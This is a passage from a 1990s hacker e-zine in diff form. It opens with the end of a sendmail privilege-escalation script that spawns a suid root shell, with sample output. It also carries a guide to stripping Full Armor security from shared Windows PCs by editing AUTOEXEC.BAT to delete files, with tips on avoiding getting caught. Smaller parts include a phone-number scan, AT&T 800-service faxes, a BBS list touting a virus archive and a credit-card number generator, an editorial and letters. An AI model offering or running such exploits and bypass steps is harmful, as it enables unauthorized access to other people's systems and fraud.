+$SENDMAIL $DEBUGFLAGS -bs < sendmail.script
+
+# give it time to execute.
+sleep 4
+
+# cleanup in 5 seconds
+(sleep 5; rm -rf $TEMPDIR ; rm /tmp/sm.cf) &
+
+if [ -u setid0 ]
+then
+ echo "setid0 is a suid shell.  executing..."
+ cd /
+ $TEMPDIR/setid0 /bin/csh
+ echo "end of script."
+ exit 0
+else
+ echo "setid0 is not suid; script failed."
+ echo "apparently, you don't have the bug.  celebrate :("
+ exit 1
+fi
+
+---------------------------------CUT HERE-----------------------------------
+
+% sm.sh
+<bunch of echo's deleted for brevity>
+setid0 is a suid shell.  executing...
+#
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+                              Full (No) Armor
+                             By: The Godfather
+                               Phile 5 of 7
+
+    I hear you seasoned hackers saying how lame this phile is going to be,
+and you're right.  But, some people actually think this is worth something,
+and I am going to publish it.
+
+Introduction
+------------
+You've heard of Full Armor.  Walmart machines have it, so do quite a few
+businesses.  The tips in this phile are more directed towards Full Armor,
+but most will work on ALL Windows "security" programs.  Full Armor protects
+the machine from HD Formats (lame), and certain programs are unrunable,
+plus you cannot delete icons, exit Windows (depending on security setting),
+etc.  Anyway, there are times you want to actually do something on a 
+computer, so here is how to get rid of the "protection".
+
+Getting Started
+---------------
+You (might) need a floppy disk containing COMMAND.COM, you need little or
+no balls, and an IQ above a house plant.  This phile is for Full Armor
+running on Windows 3.1, or 3.11.
+
+How to do the 3133+3 (sic) Hack
+-------------------------------
+Turn on the machine, or reboot if it has the added "protection" of that
+stupid Packard Bell Explorer (name?) thing.  To get rid of Explorer, and 
+quite a few frontends, simply hold both Shift Keys down while Windows starts.
+
+If you minimize program manager, a "Full Armor" icon will be in the bottom
+right corner.  Right click on it, and ask to uninstall it.  It will ask for
+a password.  Just click on "About", and when that screen comes up, hit
+"Alt-Ctrl-Delete", and press enter, until Full Armor has disappeared.  Good,
+one layer is removed.
+
+Note: If the machine allows you to exit windows, do the following, but
+skip the word processor part, simply cd /DOS and use EDIT to edit the
+AUTOEXEC.BAT file.
+
+Find a word processor, any will do, even notepad.  Open AUTOEXEC.BAT,
+hopefully that won't be write protected (yikes).  Turn everything to do
+with Full Armor into mudpuddles (delete it).   Do the same with CONFIG.SYS.
+Delete the "win" command so we don't have that problem.
+
+Add the following to AUTOEXEC.BAT:
+
+echo off
+cd \
+attrib *.* -r -s -h
+cd \armor
+attrib *.* -r -s -h
+cd \windows
+attrib *.* -r -s -h
+cd \dos
+attrib *.* -r- s -h
+cd \
+mkdir \armort
+cd \armor
+xcopy *.* \armort
+ECHO y | del *.* 
+echo on
+
+Now save it, it should save, if it says cannot write to file, or write
+protected, go to section "Error 1", then return to the beginning of this
+step.  Otherwise, say goodbye to layer two, and reboot the computer.
+
+Now simply edit WIN.INI and SYSTEM.INI and get rid of those pesky drivers
+for ARMOR.  If you can't, then just start the system (windows) anyway,
+you will just have to deal with a few "Cannot find..." messages.
+Delete "STARTUP.GRP" to get rid of that Packard Bell thing permanently.
+Make sure to edit PROGMAN.INI and edit out those restrictions on Exiting
+Windows and deleting icons.
+
+Note:  a REAL simple and clean way to get rid of this program, is to go 
+to the /ARMOR (or /ARMORT) directory, and type UNINSTAL.  No password 
+needed, but it is irreversible.  The password is stored in a file, but
+is encrypted.  I think it should be easy to break the encryption though,
+but not worth the trouble.
+
+Now, wasn't that easy?  If you get caught, tell them you haven't erased the
+program (you haven't), and just copy everything from /ARMORT to /ARMOR,
+and put the drivers back in the .INIs, and replace the AUTOEXEC and CONFIG
+files, and ta-da.  If you don't care about getting caught, don't make 
+backups. 
+
+Error 1
+-------
+So they were smart and put no-write flags with the ATTRIB command on the
+"important files".  Oh hell, we MIGHT be fucked.  If you have COMMAND.COM
+on a disk, use it.  If you can get File Manager, undo the attributes on the
+"important files".  Use that brain of yours.  The weakness of all Windows
+security is the DOS prompt.  The DOS prompt is pretty much like root
+on a *nix.
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+                               
+                               950-xxxx Scan
+                             By: The Godfather
+                               Phile 6 of 7
+
+Note:  I did this for MY scanning pleasure, but decided maybe someone was
+       interested, so I'll go ahead and put it in this mag.  The format
+       is 950, and customer service number.  "NOT-ANSW" means either (1)
+       I couldn't get the service number, or (2) it wouldn't give me an
+       operator to get it.  Most likely 2.  This is valid in the 214 NPA,
+       some may be in others.  This is not a complete scan.
+
+950-0800,  Service:  1-800-NOT-ANSW
+950-1007,  Service:  1-800-NOT-ANSW
+950-1011,  Service:  1-800-NOT-ANSW
+950-1022,  Service:  MCI                (Stopped)
+950-1999,  Service:  1-800-275-0100
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+                            800 Number Services
+                              Part One of Two
+                             By: The Godfather
+                               Phile 7 of 7
+
+Note:  This is not any information I got from brilliantly social engineering
+       Bell employes.  This is simply a reprinted set of faxes.  I am going
+       to publish this because some people don't have fax machines, or the
+       time to get this the bloody faxes.
+
+       If you are going to use this information to setup an 800 line, and 
+       are not expecting to pay for it, read Telsa's file before this.
+
+       This part is a reprint of their features.  The actual 800 services
+       will be in part two.
+
+++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 0  ++++
+
+Date:  Sat  Jan xx 03:xx:xx GMT 199x
+
+Attention To:  MrHacker
+
+Destination Fax:  +1 214 xxx xxxx
+
+From:  AT&T Fax Library
+
+Subject:  12112 - AT&T 800 Service Features
+
+Original Page Count:  8 (excluding cover page(s))
+
+UA-Message ID:  1xx2xx1xx9
+
+Addressed To:  fax!+1214xxxxxxx (MrHacker)
+
+
+++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 1  ++++
+
+AT&T Advanced 800 Features Close-up
+
+800 After Hours
+---------------
+
+Don't Leave Your Weekend and Nighttime Callers In The Dark.
+Use AT&T 800 After Hours to Highlight Your Business Hours.
+
+A simple sign in a window can inform customers who arrive after closing
+time of the best time to return.  What if you could do the same thing for
+customers who call your AT&T 800 number when you're not there?
+
+That's the idea behind AT&T 800 After Hours, one of the new Advanced 800
+Features packages designed to help meet the specific needs of business like
+yours -- without complicated and expensive equipment.
+
+With AT&T 800 After Hours, your customers won't be greeted by an unanswered 
+phone or a fuzzy, unprofessional-sounding answering machine.  Instead a 
+customized, professionally recorded message tells them the best times to call
+back.  For example:
+
+       "Thank you for calling XYZ Travel.  We are open to serve you from
+        9 a.m. to 5 p.m., Monday through Friday.  Please call back during
+        business hours."
+
+Advanced 800 Features, Added 800 Value.
+---------------------------------------
+
+AT&T 800 After Hours can enhance your customer service when you're closed,
+by giving your customers the information they need with a professionally 
+recorded spoken message.  And that can mean more callbacks and increased
+sales. 
+
+Plus, AT&T 800 After Hours is part of the AT&T Network.  So you can enjoy
+all the advantages of courteous customer service without the expense of 
+purchasing and maintaining on-premises equipment and answering systems that
+can break down.
+
+You can also control 800 service usage charges after hours.  Calls do not 
+reach your access lines, and you're charged only for the actual duration of 
+your outgoing message.
+
+What's more, AT&T 800 After Hours can also help combat fraud, because calls
+made after hours terminate in the AT&T Network -- these calls simply don't
+`get through' to your location.
+
+To put AT&T 800 After Hours to work for your business, or for more infor-
+mation, please call your AT&T Account Executive or call an AT&T Represent-
+ative.
+
+
+++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 2  ++++
+
+AT&T Advanced 800 Features Close-up
+
+Incoming Call Attendant
+-----------------------
+
+This Receptionist Speaks Up to 100 Languages, Answers 50,000 Calls an Hour,
+And _Never_ Gets Sick.
+
+Ideally, the perfect receptionist should handle all your calls promptly and
+cheerfully -- 24 hours a day, 365 days a year.
+
+That's the idea behind AT&T Incoming Call Attendant, one of our new Advanced
+800 Features packages designed to help meet the specific needs of businesses
+like yours -- without complicated and expensive equipment. 
+
+With AT&T Incoming Call Attendant, your `receptionist' is part of the AT&T
+Network.  All day, every day, this professionally recorded male or female
+voice will greet your callers and connect them to the individual, department,
+or location they are trying to reach.
+
+Touch-tone callers need only respond to a simple prompt with their keypad
+to be efficently and effectively routed.  (Rotary-dial callers can simply 
+stay on the line to be routed wherever they wish.)
+For example:
+
+       "Thank you for calling XYZ Company.  For sales, press 1.  For 
+       service, press 2.  For promotions, press 3."
+
+Advanced 800 Features, Added 800 Value.
+---------------------------------------
+
+AT&T Incoming Call Attendant comes with an extensive benefits package, too.
+And these are benefits that help _save_ you money.
+
+For instance, you may spend less on receptionist functions, _and_ free your
+current staff for more rewarding and productive work.  You may enjoy maximum
+call throughput and improved customer satisfaction through elimination of 
+human error in call handling.  You may benefit from unprecedented call 
+handling volume capabilities of up to 50,000 calls per hour.  And you'll
+have a receptionist who can speak 100 languages.
+
+You may also save on usage plus receive additional savings on maintenace,,
+because with AT&T Incoming Call Attendant, there's no on-premises equipment
+required.
+
+To put AT&T Incoming Call Attendant to work for your business, or for more
+information, please call your AT&T Account Executive, or call an AT&T
+Representive.
+
+
+++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 3  ++++
+
+AT&T Advanced 800 Features Close-up
+
+Toll-Free Call Connector
+------------------------
+
+You Can't Control Where Your 800 Calls Are Coming From.
+But Now You Can Have _Complete_ Control Over Where They're Answered.
+
+Let's say you want your Boston office to handle all orders from the New
+England states.  You want your New York office to do the same for the Mid-
+Atlantic states.  Plus, all other calls should be routed to New York.
+
+If you use one AT&T 800 number for all calls, how in the world can you be
+sure the right call goes to the right location?
+
+That's precisely the idea behind AT&T Toll-Free Call Connector, one of our
+new Advanced 800 Features packages designed to help meet the needs of 
+businesses like yours -- without complicated and expensive equipment.
+
+With AT&T Toll-Free Call Connector, you can route calls from just around the
+corner, another part of the country, or from around the world, with 
+pinpoint accuracy.
+
+You can route incoming calls based upon the local exchange code, area code,
+and even the country of each caller.  Send calls to different call centers
+based on the time of day or day of the week.  You can even designate the
+percentage of calls you want each location, department, or _person_ to
+handle.  Just tell us where you want your calls to go, and we'll do the
+rest. 
+
+Plus, AT&T Toll-Free Call Connector is so flexible, you can change your
+allocation percentages* with just 5 minutes' notice.
+
+How does this work in the real world?  Here's an example:
+
+       In the scenario above, you would obviously want all calls from
+       Massachusetts directed to your Boston office.  In addition, you
+       can specify that calls from specific exchange codes should be
+       sent to specific agents, e.g., all callers from the Boston area
+       should be sent directly to Debbie for special handling.
+
+       To keep servicing your customers after 5 p.m. without the expense
+       of a second shift at both call centers, you could easily arrange
+       for _all_ evening calls to be sent to your New York office.  What's
+       more, AT&T Toll-Free Call Connector allows you to allocate these
+       calls to individual representatives in New York - 60% to Dave,
+       40% to Jonathan, and all international calls to Holly.
+
+* Change charges apply.
+
+
+++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 4  ++++
+
+With AT&T Toll-Free Call Connector, you can economically enhance your
+customer service by providing extra hours of call answering -- without
+keeping your call centers open one minute longer than usual.  
+
+This, of course, is only one way to benefit from this incredibly versatile
+Advanced 800 Features package.  Your AT&T Account Executive can help you
+tailor its capabilities to fit your operation.
+
+Advanced 800 Features, Added 800 Value
+--------------------------------------
+
+AT&T Toll-Free Call Connector can be your business's connection to more 
+expeditious and appropriate call handling, and simplified staffing across
+multiple locations.  All of which can quickly add up to maximum call 
+completion, happier customers, and increased sales.
+
+Plus, since AT&T Toll-Free Call Connector is built into the AT&T Network,
+there's no special equipment required at your locations -- so you can save
+even more.
+
+To put AT&T Toll-Free Call Connector to work for your business, or for more
+information, please call your Account Executive or call an AT&T 
+Representative.
+
+++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 5  ++++
+
+AT&T Advanced 800 Features Close-up
+
+800 Caller Greeting
+-------------------
+
+Add a Personal Touch to the Way You Handle Your Customer's Calls.
+And They'll Get the Right Message About Your Business.
+
+Imagine customers calling your 800 number, but all your agents are busy.  If
+you put them on hold, their patience could wear thin -- and you could lose
+the calls. 
+
+But if you greeted the customers right away with a friendly and informative
+message, you'd show them that you appreciate their business -- and you'd
+be more likely to _get_ their business.
+
+That's the idea behind AT&T 800 Caller Greeting, one of five new Advanced
+800 Features packages designed to help meet your specific business needs --
+without complicated and expensive equipment.
+
+With AT&T 800 Caller Greeting, you can provide a customized annoucement at
+the beginning or at almost any point during your customer's call.
+
+So instead of leaving your customers `hanging' while you route their calls,
+you can tell them about certain aspects of your business that could 
+generate new sales opportunities.  You can announce special sales, your
+hours of operation and locations, new products, or your other 800 numbers,
+to name a few.
+
+You can also streamline the way you process calls, by providing customers
+with answers to routine questions in advance.  For example:
+
+       "Thank you for calling XYZ Computers.  If you're calling about 
+       desktop models, please call 1 800 XXX-XXXX.  Otherwise, please
+       hold, and an agent will be with you shortly."
+
+You can also use AT&T 800 Caller Greeting to confirm a selection the caller 
+made from an options menu.  For example:
+
+       "Thank you for pressing 1 for service.  Please have your model
+       number ready."
+
+Of course, your message will be professionally recorded in the AT&T Network.
+And you can deliver your message in English or in more than 100 different
+languages.
+
+Advanced 800 Features, Added 800 Value.
+---------------------------------------
+
+AT&T 800 Caller Greeting helps you provide customers with more personal
+service, and that gives your customers good reason to keep calling back.
+
+
+++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 6  ++++
+
+Plus, by providing customers with helpful information in advance, your
+agents may spend less of their valuable time answering questions -- and more
+time generating sales.
+
+AT&T 800 Caller Greeting also helps you save on usage and maintenance
+charges, because it requires no recording, answering, or playback equipment.
+
+To put AT&T 800 Caller Greeting to work for your business, or for more
+information, please call your Account Executive or an AT&T Representative.
+
+
+++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 7  ++++
+
+AT&T Advanced 800 Features Close-up
+
+Special Caller Handling
+-----------------------
+
+Your Customer's Special Needs Deserve Special Service.
+And With Special Caller Handling, Now You Can Cater to Virtually Every Caller.
+
+Suppose you want to provide preferential treatmeant to your most valued
+customers by efficiently directing their calls to specific agents or 
+departments.  Or perhaps you want to give these customers direct access to
+confidential information such as their account balance.  At the same time,
+new customers may simply be calling to place an order.
+
+How do you cater to them all, without wasting their time, your agent's time,
+and _your money_, routing calls from one department to another?
+
+With AT&T 800 Service Special Caller Handling, that's how.  It's one of five
+new Advanced 800 Features packages designed to help meet the specific needs
+of your business -- without complicated or expensive equipment.
+
+With AT&T Special Caller Handling, you set up in advance the type of 
+information or service specific customers need.  So when they call, you can
+screen and direct their calls based on the proper Account Codes, Personal
+Identification Numbers, Identification Codes, or other numbers (up to 15
+digits) enter by the caller.  For example:
+
+       "Thank you for calling XYZ Cooperative Bank.  For information about
+       your account, please enter your account number now.  For general
+       information, please stay on the line."
+
+Their calls can then be routed to a customized message or menu of options,
+allowing you to further pinpoint how you can meet your customer's needs:
+
+       *  You can designate a _special option for your most valued 
+          customers_, which will give them the opportunity to receive
+          preferential service.
+
+       *  You can _route calls based on the originating city or state_.
+
+       *  You can _prevent unauthorized calls from `getting through', by
+          routing them to a generic or customized annoucement.  Or you
+          can route overdue accounts to an annoucement that tells them
+          to call the billing department.
+
+       *  You can direct calls without the callers knowing they have been
+          `pre-screened.'
+
+
+++++  AT&T Interactive Fax  AT&T Easylink  WED JAN xx xx:57 xx  Page 8  ++++
+
+Advanced 800 Features, Added 800 Value.
+---------------------------------------
+
+AT&T Special Caller Handling makes your toll-free program more efficient by:
+
+       *  Speeding the call process
+
+       *  Automatically answering particular calls with a pleasant,
+          professionally recorded message, when appropriate, e.g., overdue
+          accounts directed to call the billing department, unauthorized
+          calls directed to a generic annoucement
+
+       *  Reducing the time your agents spend on each call
+
+       *  Eliminating human error and taking the guesswork out of where the
+          call should be directed
+
+       *  Handling each caller differently, based on their profile
+
+It may translate into lower usage charges, better customer service, and more
+sales opportunities for your business.
+
+To put AT&T Special Caller Handling to work for your business, or for more
+information, please call your Account Executive or call an AT&T Represent-
+ative.
+
+
+
+Okay, I hope I didn't make any typing errors, and the next issue will have
+the second half of this article with the actual 800 *Line services detailed.
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+                               MOT BBS Update
+                             By: The Godfather
+
+    Hackers and phreaks live and dwell by boards.  So, MOT will publish 
+names of boards that are worth a look.  If you want us to put your board
+here, give us a ring at the inet address, or find me on the L0pht board, 
+or somewhere...
+
+
+Digital Entropy, Sysop: Wraith
+------------------------------------
+Phone Number:  203-624-1089
+
+Description:   Newest warez board to the 203 scene, we are the WHQ of the
+               Digital Hackers' Alliance, and a premier distro site for dCS,
+               a nation-wide courier group.  We have a huge warez section, 
+               over 1 gig of files online, and have the largest virus section 
+               in all the US, over 11,000 differnet virii online, all labeled 
+               and indexed.  We also have a very comprehensive H/P/A/C
+               section with over 3,000 files online.  We also have several 
+               local message bases, and are looking to add several net-bases 
+               in the very near future. The board has three nodes, all 
+               running on ViSiON-X v.99e.
+
+Features:      File section, messages, multi-node chat, online credit-card #
+               generator, paging other users, MOT, etc...  Have phun!
+
+Additional
+Information:   Type "APPLY" from the login matrix, and the NUP is PSYKOSONIK
+
+
+The L0pht BBS, Sysop: Big Brother
+---------------------------------------
+Phone Number:  n/a, telnet to:  bbs.l0pht.com
+
+Description:   Home of many excellent hacks/phreaks, this board is a Unix
+               based board.  Feel free to contribute to the community.  
+               Telephony (phreaking), hacking, mac, unix, security, and more
+               are discussed.
+
+Features:      File section, messages, chat (IRC like, meetings held online),
+               paging other users, etc...  Have phun!
+
+Additional 
+Information:   To get an account, login as BBS
+
+
+Artistic Illusions, Sysop: Mind Rape
+---------------------------------------
+
+Phone Number:  619-793-0471
+
+Description:   New board, I am cosysop, if the sysop hasn't forgotten me :)
+               Has promise, give it a call.
+
+Features:      Online games, files, messages, friendly sysop, MOT.
+
+
+Defcon Voice Bridge, Sysop: Dark Tangent
+-------------------------------------------
+
+Phone Number:  801-855-3326
+
+Description:   Not modem, but VOICE board.  Mostly phreaks, but some
+               hackers call also.
+               
+Features:      Has one-on-one chat, voice
+               BBS, FREE VMBs, and a Voice Bridge capable of 30 people
+               all together split into 5 "rooms".
+
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-                                
+
+                                Distribution
+
+   Well, there is the second issue. If you think you can improve this 
+newsletter, drop me a line.  I'll try to put this newsletter out every month 
+or so, maybe sooner than that.  The more articles I get, the bigger the 
+newsletter, the more information.  I'll put this newsletter up in 
+"ftp.fc.net", "ftp.2600.com", and "ftp.eff.org", if they don't mind.  If you 
+have/own an FTP site, and would welcome MOT, please drop me a line.  And 
+please people, send those articles in.
+
+Current FTP Distibution:
+
+ftp.fc.net:
+
+/pub/deadkat/incoming        (I uploaded it to deadkat)
+/pub/defcon/incoming         (Dark Tangent promised me a directory)
+
+ftp.2600.com:
+
+/pub/incoming                (I uploaded it to Emmanuel)
+
+ftp.eff.org:
+
+/pub/incoming                (Hopefully they will give me a directory)
+
+Current IRC Distribution:
+
+#phreak
+#2600
+#hack                        (I didn't get MOT #1 to them)
+
+Current Newgroup Distrubution:
+
+alt.2600                     (I don't know if I will get MOT #1 to
+alt.hacker                    the newsgroups)
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+                                  Editorial
+                              By: The Godfather
+
+   Another fun filled editorial filled with my usual rants and raves.  This
+issue, I'll look at the current state of alt.2600 the newsgroup, and the
+AOLamer issue.
+
+   Well, you just spent your time (and sometimes money) reading alt.2600.
+Although you might have managed to glean a tiny nugget of information, the
+newsgroup is filled with AOL.COM, GNN.COM (a subsidary of AOL), PRODIGY.COM,
+and a few other domains, all with lamers dripping in their subscription
+veins, all asking shitty stupid questions, bashing other (mostly very
+knowledgeable) folks, and just being assholes (and don't forget the warez
+puppies and the little kids who ask for dirty pics).
+   Wait you say, the point is that lamers are SUPPOSED to learn.  You are
+most certainly correct.  But lets take a quick peek into "The Godfather's
+Dictionary", and see how I define "LAMER".
+
+LAMER, n., A person that will never learn, or never wants to learn anything
+           except where to get the latest dirty pics or warezzzzzzzzz.  See
+           also scientific class "doofus idious".
+
+Hopefully that gives you a better idea of what I am talking about when I say
+"lamer".  
+   Not everyone who asks a "stupid" question is a lamer (the kind I defined
+above).  Maybe they haven't been EDUCATED about that sort of thing, but
+meaningless bashing is NOT productive on either side.  Wait, I hear you
+saying, newbies are supposed to learn by themselves.  I know, I learned by
+myself.  Still, maybe a push in the right direction is better than calling
+them "lamer punk ass".
+    AOL.COM.  A domain that is shuned, and beat upon with the heavy stick
+of lameness.  Still, I have been on AOL before.  Not for the inet access, 
+but for their INFORMATION CONTENT.  I can read the New York Times, Time
+Magazine, Wired, and other magazines in less time and effort than using 
+their respective web pages.  After the artwork is downloaded, it is fast,
+efficient, and looks nice.  "But, you have to pay a lousy $2.95 per hour".
+Sheesh, can't you see the absolute FALICY off that.  Unless you spend hours
+on the web, they do give you 5 hours free, plenty of time for reading the
+newspaper and getting mail, plus its only $9.95 a month.  The cheapest IP
+I have seen is $14.95 for SHELL account (which I prefer anyway).  Not to 
+mention, you don't HAVE to pay for it with YOUR credit card.  Still, anyone
+that calls him/herself a hacker because they got free AOL time or account(s),
+is not "elite", or even a real hacker in a sense.
+    Anyway, poke those pearls of wisdom into your brains, and see what 
+surfaces.  Maybe an understanding of "lamers", "newbies", and "3133+3" 
+people, or maybe you think I am the "lamer punk ass".  I dunno, and I don't
+care.
+
+If you disagree with me, go ahead and send me hate mail.  But after that
+go send a letter to ROOT@CERT.ORG telling them your info and who you are 
+going to hack next, and who's systems you have already penetrated.  They 
+will help you I'm sure.  They are 3133+3.
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+
+                            Letters to the Editor
+                                
+From:  bspline (on IRC)
+
+   In your editorial (MOT #1) you said "RM /R", that is incorrect.
+
+                     - bspline
+
+[ He's right, but I had been doing backups with that awful MS-DOS
+  command, and was used to typing RESTORE /x, and didn't think about that.
+  I always look through the articles to see if they are valid (but not all
+  are tested), but I missed that.  You know what I really meant anyway. ]
+
+From:  bspline (on IRC)
+
+   In your "Blocking ANI" (MOT #1) article, you said ANI was analogous to 
+   Caller ID.  That is wrong and untrue.
+
+                      - bspline
+
+[ I said it was "like" Caller ID, I DID NOT say it functioned the same way,
+  I said specifically that they were different.  Next time send that to
+  /dev/null please.  Besides, I said clearly in the article that I was going
+  to BRIEFLY explain ANI.  Sheesh. ]
+
+From:  bspline and kmem (on IRC)
+
+   This magazine has too much beginner information.
+
+[ So.  Not every article in Phrack is filled chock full with info on tech
+  details either.  Besides, we will have too many people that don't know
+  anything if there isn't SOME beginning info.  Don't forget, that was a 
+  beginning newsletter.  My first one too.  If you want technical stuff, get
+  me articles WITH tech stuff.  That one should never have been spoken, 
+  not to mention sent to /dev/null. ]
+
+                       - bspline and kmem
+
+Note:  I did rag a little at bspline, but he is a really good phreak, and
+       knows his stuff.  Don't take it the wrong way.
+
+-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-*-
+                                               
+                                MOT News
+
+
+Emmanuel Goldstein Releases "Off The Hook" on FTP Site
+------------------------------------------------------
+Emmanuel Goldstein has put up audio copies of his radio show "Off The Hook"
+on his ftp site (ftp.2600.com).  Compressed in GSM format (players/decoders 
+available on his site), the hour long show is only approximately 6 megs each.
+
+               (Information Provided by: Emmanuel Goldstein)
+
+
+Virus Circulating in America Online
+-----------------------------------
+The "AOL Gold" virus is circulating throughout America Online.  Claiming
+to be the newest version of the America Online (not AOHell, but AOL)
+software, when the installation program is run, your hard drive is formatted.
+
+              (Information Provided by: AOL and "Off the Hook")
+
